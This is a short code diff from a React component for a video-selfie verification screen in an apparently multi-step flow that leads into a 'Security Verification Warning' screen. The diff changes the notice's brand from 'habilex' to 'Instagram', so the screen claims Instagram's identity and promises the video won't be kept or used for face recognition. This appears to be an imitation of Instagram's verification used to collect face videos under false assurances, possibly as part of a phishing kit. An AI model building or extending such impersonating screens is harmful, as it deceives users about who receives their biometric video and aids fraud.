@@ -487,22 +487,15 @@ function Screen4({ onBack, onSubmit }: { onBack: () => void; onSubmit: () => voi
             <circle cx="10" cy="14.5" r="1.5" fill="#6e6e6e" />
           </svg>
           <p className="text-[#8e8e8e] text-[13.5px] leading-[1.45]" style={{ fontFamily: FONT }}>
-            This video will never be visible on{" "}
-            <span className="text-[#a0a0a0] font-medium">habilex</span> and will
-            be deleted within 30 days. This won't use face recognition or
-            collect biometric data.
+            This video will never be visible on Instagram and will be deleted within 30 days. This won't use face recognition or collect biometric data.
           </p>
         </div>
         <button onClick={onSubmit} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
           Submit
         </button>
       </div>
-      <div className="flex justify-center pb-3 shrink-0">
-        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
-      </div>
     </>
-  );
-}
+  );}
 
 /* ─────────────────────────────────────────────
    SCREEN 5 — Security Verification Warning
